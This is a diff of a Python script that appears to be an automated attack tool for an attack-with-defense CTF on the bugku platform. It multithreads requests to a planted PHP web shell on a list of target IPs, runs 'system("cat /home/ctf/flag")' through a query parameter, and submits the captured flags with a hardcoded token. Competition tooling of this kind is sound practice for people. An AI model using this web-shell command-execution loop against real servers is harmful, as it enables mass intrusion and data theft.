@@ -49,8 +49,9 @@ file.close()
 
 def log(Record_information):
     file = open('log.txt', "a")
-    file.write(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())+'  {}\n'.format(Record_information))
+    file.write(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()) + '  {}\n'.format(Record_information))
     file.close()
+
 
 def resume(i):
     global url2
@@ -72,7 +73,8 @@ def resume(i):
             message = "失去链接:" + url2
             log(message)
 
-def shell_post(i): # post请求
+
+def shell_post(i):  # post请求
     try:
         url1 = i + path1
         try:
@@ -101,7 +103,8 @@ def shell_post(i): # post请求
             urlflag = "https://ctf.bugku.com/pvp/submit.html?token=f9dc034124f024d1d8faac58fe693382&flag=" + flags
             print(urlflag)
             try:
-                results = requests.get("https://ctf.bugku.com/awd/submit.html?token=[token]&flag=[flag]" + flags, headers=headers)
+                results = requests.get("https://ctf.bugku.com/awd/submit.html?token=[token]&flag=[flag]" + flags,
+                                       headers=headers)
                 # print(results.text)
                 results = results.text
                 result = re.findall("Flag\w\w", results)
@@ -110,7 +113,7 @@ def shell_post(i): # post请求
                     print("-------------------------------------------------------------------------------------------")
                 else:
                     print("flag提交失败!!!")
-                    message = i +"\n                     flag提交失败!!!\n                     " + urlflag
+                    message = i + "\n                     flag提交失败!!!\n                     " + urlflag
                     log(message)
                     print("-------------------------------------------------------------------------------------------")
                     message = "-------------------------------------------------------------------------------------------"
@@ -126,8 +129,8 @@ def shell_post(i): # post请求
         except:
             print("没有flag!!!")
             print("-------------------------------------------------------------------------------------------")
-       # flag_submit()
-       #flag_list(flags)
+    # flag_submit()
+    # flag_list(flags)
 
     except requests.exceptions.RequestException as e:
         print("失去链接:" + url)
@@ -137,8 +140,10 @@ def shell_post(i): # post请求
         log(message)
         print("-------------------------------------------------------------------------------------------")
 
+
 # path_get = "/upload/0/file/202210/111.php?aaa=print_r(readfile(\'flag\'));" # 命令执行等
-path_get = "/upload/0/file/202210/111.php?aaa=system(\"cat /home/ctf/flag\");" # 命令执行等
+path_get = "/upload/0/file/202210/111.php?aaa=system(\"cat /home/ctf/flag\");"  # 命令执行等
+
 
 def shell_get(i):  # get请求
     for i in ip_list:
@@ -164,6 +169,7 @@ def shell_get(i):  # get请求
             log(message)
             print("-------------------------------------------------------------------------------------------")
 
+
 def flag_submit(response, i):
     try:
         flags = (re.search("flag{.*}", response.text).group(0)[:38])
@@ -171,7 +177,8 @@ def flag_submit(response, i):
         urlflag = "https://ctf.bugku.com/pvp/submit.html?token=f9dc034124f024d1d8faac58fe693382&flag=" + flags
         print(urlflag)
         try:
-            results = requests.get("https://ctf.bugku.com/awd/submit.html?token=[token]&flag=[flag]" + flags, headers=headers)
+            results = requests.get("https://ctf.bugku.com/awd/submit.html?token=[token]&flag=[flag]" + flags,
+                                   headers=headers)
             # print(results.text)
             results = results.text
             result = re.findall("Flag\w\w", results)
@@ -197,11 +204,13 @@ def flag_submit(response, i):
         print("没有flag!!!")
         print("-------------------------------------------------------------------------------------------")
 
+
 def The_target(url):
     file = open('ip_Survival_goal.txt', "w")
     print(url)
     file.write('{}\n'.format(url))
     file.close()
+
 
 def Threads(amount, total):
     for i in range(amount):
@@ -210,27 +219,33 @@ def Threads(amount, total):
         thread = threading.Thread(name='i', target=attack, args=(int(x), int(x + y)))
         thread.start()  # 启动线程
 
+
 def attack(x, y):
     while True:
         for ip in range(x, y):
             shell_post(ip_list[ip])
-            #shell_get(ip)
-            #time.sleep(5)
+            # shell_get(ip)
+            # time.sleep(5)
+
+
 def main():
     amount = 1
     total = 45
-    print("0.默认:线程数{};目标总数{}".format(amount, total))
-    print("1.调整线程数")
-    print("2.调整目标总数")
-    switch = input("输入执行的序号")
-    if switch == 0:
-        pass
-    elif int(switch) == 1:
-        a = input("请输入需要修改的线程数:")
-        amount = a
-    elif int(switch) == 2:
-        b = input("请输入需要修改的目标总数:")
-        total = b
+    while True:
+        print("0.默认:线程数{};目标总数{}".format(amount, total))
+        print("1.调整线程数")
+        print("2.调整目标总数")
+        switch = input("输入执行的序号:")
+        if int(switch) == 0:
+            break
+        elif int(switch) == 1:
+            a = input("请输入需要修改的线程数:")
+            amount = a
+        elif int(switch) == 2:
+            b = input("请输入需要修改的目标总数:")
+            total = b
+
     Threads(amount, total)
+
 
 main()
